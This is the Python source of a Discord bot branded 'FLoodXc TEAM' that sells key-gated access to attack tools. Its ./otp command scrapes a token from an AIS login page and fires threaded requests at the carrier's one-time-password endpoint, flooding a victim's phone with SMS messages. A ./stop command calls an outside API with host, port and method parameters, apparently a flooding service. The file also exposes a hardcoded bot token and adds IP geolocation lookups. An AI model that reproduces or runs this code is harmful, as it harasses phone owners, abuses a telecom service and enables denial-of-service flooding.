import discord,requests;from ping3 import ping
import string;import random;from requests import Session
from threading import Thread;from re import search
from discord.ext import commands

class SMS:
    def AISPLAY_FUNC(phone):
        try:
            session = Session();login = session.get("https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated",headers={
            "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX2 Build/HUAWEIDUB-LX2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36"}).text
            token = search("""<input type="hidden" id='token' value="(.*)">""", login).group(1);session.post("https://srfng.ais.co.th/login/sendOneTimePW",data=f"msisdn={phone}&serviceId=AISPlay&accountType=all&otpChannel=sms",headers={
                "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX2 Build/HUAWEIDUB-LX2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "authorization": f"Bearer {token}"});del session
        except:
            pass
    
    def AISPLAY(phone, amount):
        for i in range(amount):
            SMS.AISPLAY_FUNC(phone)

def key_generator(size=40, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

token = "ODcxODA2OTY2ODM2NjUwMDA1.YQgrgg.IPZvmgscu7h84teOyMwazy6vvvw"
client =  commands.Bot(command_prefix="./")
blacklist = ["66979379362", "0979379362"]
users = []
key = []
admin = ["837294095335817226"]

@client.event
async def on_ready():
    print("Bot is online.")

@client.event
async def on_message(message):
    msg = message.content.split()

    if int(message.channel.id) == 851057624219910194:
        
        if message.content.startswith("./key"):
            try:
                if str(msg[1]) == key[0]:
                    await message.delete()
                    users.append(str(message.author.id))
                    embed = discord.Embed(title="KEY-SUCCESS", color=0x75f542)
                    await message.channel.send(embed=embed)
                    del key[0]
            except:
                pass
        if message.content.startswith("./givekey"):
            if str(message.author.id) in admin:
                key.append(key_generator())
                embed = discord.Embed(title="GiveKey-Success", color=0xba03fc)
                await message.channel.send(embed=embed)
                await message.author.send("./key " + key[0])
        
        if message.content.startswith("./") and not message.content.startswith("./givekey") and not message.content.startswith("./key"):
            if str(message.author.id) in users:
            
                if message.content.startswith("./help"):
                    embed = discord.Embed(title="( :signal_strength:CODE BY: Pannatorn:satellite: )", description=":shield:FLoodXc | TEAM:shield:", color=0xe3a000)
                    embed.add_field(name="ยิงเบอร์มือถือ", value=":vibration_mode:/otp [เบอร์มือถือ] [จำนวนข้อความ]", inline=False)
                    embed.add_field(name="เครื่องมือต่างๆ", value=":tools:  ตรวจสอบปิง : /ping [ไอพี]\n:satellite: เช็คสถานะเว็บ : /httpcheck [url]\n:mag_right: เช็คข้อมูลIP : /geoip [ไอพี]", inline=False)
                    embed.add_field(name="คำสั่งสำหรับAdmin", value=":crossed_swords:เสกKeyใช้งาน : /givekey", inline=False)
                    await message.channel.send(embed=embed)
                if message.content.startswith("./stop"):
                    r = requests.get("http://139.59.229.193/api.php?host=test&port=80&time=20&method=STOP")
                    embed = discord.Embed(title="STOP : ALL SUCCESS", color=0x00ff00)
                    await message.channel.send(embed=embed)
        
                if message.content.startswith("./otp"):
                    if str(msg[1]) in blacklist:
                        embed = discord.Embed(title="Number is blacklisted", color=0xFE0202)
                        await message.channel.send(embed=embed)
                    else:
                        try:
                            amount = int(msg[2])//10
                            for i in range(10):
                                Thread(target=SMS.AISPLAY, args =(f"66{msg[1][1:]}", int(amount),)).start()
                            print("Command has been sended.")
                            embed = discord.Embed(title="SPAM OTP-AIS  : "+msg[1]+" : Success!", color=0x00ff00)
                            await message.channel.send(embed=embed)
                        except:
                            print("Connection Error!")
                            embed = discord.Embed(title="ERROR : API-OFFLINE", color=0xFE0202)
                            await message.channel.send(embed=embed)
                            
                if message.content.startswith("./ping"):
                    try:
                        r = "%.2f" % int(ping(str(msg[1]))*1000)
                        embed = discord.Embed(title="Host : "+str(msg[1])+" Ping : " + str(r) + " ms", color=0x1296f9)
                        
                    except:
                        embed = discord.Embed(title="Host : "+str(msg[1])+" Ping : " + "Request timed out", color=0x1296f9)
                    
                    await message.channel.send(embed=embed)
                
                if message.content.startswith("./httpcheck"):
                    req = requests.get(msg[1])

                    embed = discord.Embed(title="API-Floodxc", color=0x9875EF)
                    embed.add_field(name="HttpCheck - Success",value="```Status : "+str(req.status_code)+"\nStatus Message : "+str(req.reason)+"```")
                    await message.channel.send(embed=embed)

                if message.content.startswith("./geoip"):
                    api = "http://ip-api.com/json/"+str(msg[1])
                    req = requests.get(api)
                    data = req.json()
                    embed = discord.Embed(title="Geo-Location",description=f'Country: {data["country"]}\nCountry Code: {data["countryCode"]}\nRegion: {data["region"]}\nRegion Name: {data["regionName"]}\nCity: {data["city"]}\nZip Code: {data["zip"]}\nLatitude: {data["lat"]}\nLongitude: {data["lon"]}\nTime Zone: {data["timezone"]}\nISP: {data["isp"]}\nOrganization: {data["org"]}',color=0x5167ac)
                    await message.channel.send(embed=embed)

            else:
                embed = discord.Embed(title="กรุณาใส่ Key [./key ตามด้วยkeyที่ได้รับจากAdmin]", color=0xFE0202)
                await message.channel.send(embed=embed)
                
client.run(token)